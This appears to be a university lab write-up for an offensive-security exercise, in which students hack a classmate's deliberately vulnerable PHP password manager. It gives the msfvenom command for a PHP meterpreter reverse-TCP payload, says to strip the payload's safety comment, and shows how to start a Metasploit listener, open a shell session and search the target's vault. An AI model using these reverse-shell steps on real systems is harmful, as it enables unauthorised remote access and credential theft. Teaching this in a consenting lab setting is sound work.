# Week 5 | Offensive

```
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .
```

## Part 0: Adding our Sensitive Information

In the last lab, you were asked to create a new user account, create a new vault, and add some passwords along with sensitive information in the form of a .txt file. If you have not done this yet, please do so now as this will be the asset your lab partners are after when they hack your password manager.

### It is super important that you DO NOT delete volumes when redeploying your web application if you want to save the information you have added to your docker container.

You can think of the volumes in Docker as the storage used by each container. When we first spin up our web application, these volumes are generated and storage on your machine is allocated for each container.

When we create new user accounts, add passwords, and upload files, these are all stored within the volumes for our containers. This is why it is extremely important when we run redeploy to NOT delete these volumes.

It may also be more beneficial to run `start.py` and `stop.py` rather than the `redeploy.py` script as these will not delete any data we have added.

## Part 1: Planning our Attack
Some helpful definitions to recall from lecture are:
- `Vulnerability`: A weakness which can be exploited by a threat actor, such as an attacker.
- `Exploit`: A piece of code written to take advantage of a particular vulnerability.
- `Payload`: A piece of code to be executed through said exploit on a specific target.
- `Target`: A system being exploited and that will run the payload.

In this lab, we will be crafting a payload to take advantage of a vulnerability on the target machine.

1. We need to identify a vulnerability. How can we get a piece of code onto our password manager?
    - Note that this should also be a place where we can **execute** the payload. We need to be able to run our code once we somehow get it onto our target machine.

Once we have identified our vulnerability, we can begin crafting our payload!

## Part 2: Setting up Metasploit

Metasploit is a framework that allows penetration testers to identify, exploit, and validate vulnerabilities in a system. It includes an extensive set of tools specifically for penetration testing. We can use the tools to generate payloads that will allow us to easily attack a system.

We will be utilizing metasploit through a Docker container. In a "real" pen testing role, you may find it more beneficial to use metasploit via a virtual machine running Kali Linux, a distribution of Linux that includes a host of tools for offensive security (including metasploit)! For our purposes, a Docker container will allow us to quickly and easily access the tools we need.

1. First, we need to deploy a docker container running metasploit. Run the following command to pull the metasploit image and spin up a container with that new image.

    ```
    docker run --rm -it -p 4444:4444 metasploitframework/metasploit-framework
    ```

    Your terminal should now be running the metasploit docker container! You should see something similar to the following output:

    ![metasploit contianer](/lab-writeup-imgs/metasploit_container.png)

    Two things to take note of, the ASCII art will most likely be different, and your LHOST should be printed at the bottom of the terminal (highlight in red in the image above). This is the IP address of the docker container running metasploit. You should take note of this IP address as we will need to use it during the lab.


## Part 3: Crafting our Payload

As mentioned above, metasploit comes with a suite of tools for us to use for pentesting and offensive security purposes. One of those tools being msfvenom. Msfvenom lets us generate customized payloads for our specific attack. We will be using msfvenom to easily craft the payload we will be using in this lab!

The payload we will be crafting will be built off of the `meterpreter` payload. This payload provides an interactive shell between the victim's machine and the attacker's machine. This shell will allow us to explore our target and execute commands on their device!

1. To generate our payload, we will use the following command:

    ```
    /usr/src/metasploit-framework/msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your EXTERNAL IP address> LPORT=4444 -f raw
    ```

    - `-p php/meterpreter_reverse_tcp`: This specific payload builds the meterpreter payload in PHP, which is what we want since we know that the target is a PHP server. 

        The `reverse_tcp` part refers to the type of network communication method that this payload will establish. Essentially, we are creating forcing the victim's machine to connect to a service that will be running off of our machine, hence the 'reverse' part.

    - `LHOST=<Your EXTERNAL IP address> LPORT=4444`: We then set the `LHOST` and `LPORT` to match the IP address and the port that the victim will be connecting to.

        Since your target's password manager is running on their machine outside of your own internal docker network, the LHOSt must be set as your IP address, which you can find by running `ipconfig` or `ifconfig`.

    - `-f raw`: This specifies the payload should be 'raw' output, meaning it will just print to our terminal rather than being saved to a file.

2. Once you have run the command above, you should get a large output in your terminal. This is our payload! We can copy it and paste it into a `.txt` file on our machine. Make sure you save it as `reverse_tcp.php`, so that it can be executed as a PHP script.

    - Note that the payload will have a comment tag at the beginning. This is to ensure that the payload does not accidentally execute! We can remove this before saving so that the payload will run on our target machine.

## Part 4: Setting up our attacking machine
1. To select this payload, run the following command in the msfconsole container:

    ```
    use php/meterpreter/reverse_tcp
    ```

2. Once we have selected this payload, let's double check that all of our options are configured correctly. Run the following command to see all options we can configure:

    ```
    options
    ```

    You should see two possible options, `LHOST` and `LPORT`.

    - LHOST: This is the address of the machine the victim will try to connect to during our attack. It is the address that should have the service "**L**istening" for a connection. This should match the LHOSt you saw in part 1.
    - LPORT: This is the port the service will be "**L**istening" on.

    These two options should already be configured by default to match your metasploit container's IP address and the appropriate port (4444).

3. Next, we will run the following command to start the service. It will be listening on port 4444 for incoming connections from our victim's machine.

    ```
    exploit
    ```

## Part 5: Attacking the Password Manager >:)

By now, you have the service listening within your metasploit container and have successfully placed the payload on the target's machine.

We need to now somehow execute the payload to establish a connection from the target's device to our attacking machine. Can you think of a way that we can run the payload?

Once you have successfully executed the payload, you can list all of your sessions running in metasploit with the following command:

```
sessions -l
```

You should see your sessions listed with a session ID. To interact with the session of interest, enter the following command with the session ID:

```
sessions -i <ID>
```

You should now be able to access the shell connected with the victim's machine! Start exploring the target and see if you are able to extract the information from their personal vault!

## For credit:

Take a screenshot of the shell session you established, along with the .txt file uploaded by your lab partner!